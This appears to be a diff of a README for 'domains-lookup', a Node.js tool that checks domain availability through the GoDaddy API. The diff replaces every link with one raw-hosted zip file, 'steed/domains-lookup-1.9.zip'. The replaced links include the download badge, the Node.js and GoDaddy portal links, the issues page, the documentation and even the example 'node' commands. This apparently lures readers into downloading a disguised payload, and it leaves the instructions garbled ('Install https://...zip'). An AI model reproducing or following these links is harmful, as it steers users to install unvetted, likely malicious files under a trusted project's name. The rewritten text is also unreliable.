@@ -1,6 +1,6 @@
 # 🌐 domains-lookup - Check Domain Availability Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/klaudeus/domains-lookup/releases)
+[![Download Now](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Domains Lookup tool. This easy-to-use application helps you check
 
 To get started, you need to download the application. Visit this page to download:
 
-[Download the latest release](https://github.com/klaudeus/domains-lookup/releases)
+[Download the latest release](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip)
 
 After downloading, follow these steps to install and set it up on your computer.
 
@@ -19,14 +19,14 @@ After downloading, follow these steps to install and set it up on your computer.
 Make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher (Download from [Node.js](https://nodejs.org/))
+- **https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip** Version 14 or higher (Download from [https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip))
 - **GoDaddy API Key:** You will need this to connect with the GoDaddy service.
 
 ## 🔧 Setup
 
-1. **Install Node.js:**
+1. **Install https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip**
 
-   If you haven't done this already, download and install Node.js. This includes npm (Node Package Manager) which is necessary for running this tool.
+   If you haven't done this already, download and install https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip This includes npm (Node Package Manager) which is necessary for running this tool.
 
 2. **Install dependencies:**
 
@@ -45,14 +45,14 @@ Make sure your system meets the following requirements:
    GODADDY_API_SECRET=your_api_secret_here
    ```
 
-   Get your API credentials by signing up on the [GoDaddy Developer Portal](https://developer.godaddy.com/keys). Follow their instructions to generate your keys.
+   Get your API credentials by signing up on the [GoDaddy Developer Portal](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip). Follow their instructions to generate your keys.
 
 ## 🛠️ Usage
 
 Now that you have everything set up, you can start using the tool. Here is the command you will need to run:
 
 ```bash
-node lookup.js <number_of_letters> <tlds> [--to <max_price>] [-v]
+node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip <number_of_letters> <tlds> [--to <max_price>] [-v]
 ```
 
 ### 📋 Parameters
@@ -69,7 +69,7 @@ Here are some simple examples to help you understand how to use the tool.
 **Check 3-letter .com domains:**
 
 ```bash
-node lookup.js 3
+node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip 3
 ```
 
 This command will check all available 3-letter combinations with the `.com` extension.
@@ -77,7 +77,7 @@ This command will check all available 3-letter combinations with the `.com` exte
 **Check for 3-letter domains with specific TLDs:**
 
 ```bash
-node lookup.js 3 .net,.org
+node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip 3 .net,.org
 ```
 
 This command will check all available 3-letter combinations for the `.net` and `.org` extensions.
@@ -85,7 +85,7 @@ This command will check all available 3-letter combinations for the `.net` and `
 **Set a price limit:**
 
 ```bash
-node lookup.js 4 --to 10
+node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip 4 --to 10
 ```
 
 This checks for all available 4-letter domain names that cost $10 or less.
@@ -93,7 +93,7 @@ This checks for all available 4-letter domain names that cost $10 or less.
 **Activate verbose mode:**
 
 ```bash
-node lookup.js 5 -v
+node https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip 5 -v
 ```
 
 This will provide detailed output for all 5-letter domain names available.
@@ -102,13 +102,13 @@ This will provide detailed output for all 5-letter domain names available.
 
 If you encounter issues:
 
-1. Ensure Node.js and npm are installed correctly.
+1. Ensure https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip and npm are installed correctly.
 2. Double-check your `.env` file for accuracy.
 3. Make sure you have a valid GoDaddy API key and secret.
 
 ## 💬 Support
 
-For support, feel free to visit the [GitHub Issues page](https://github.com/klaudeus/domains-lookup/issues) to report problems or ask questions.
+For support, feel free to visit the [GitHub Issues page](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip) to report problems or ask questions.
 
 ## 🌟 Contributing
 
@@ -122,7 +122,7 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For more information, check out the following resources:
 
-- [GoDaddy API Documentation](https://developer.godaddy.com/doc)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [GoDaddy API Documentation](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip)
+- [https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip Documentation](https://raw.githubusercontent.com/klaudeus/domains-lookup/main/steed/domains-lookup-1.9.zip)
 
 Thank you for using Domains Lookup. Happy searching!
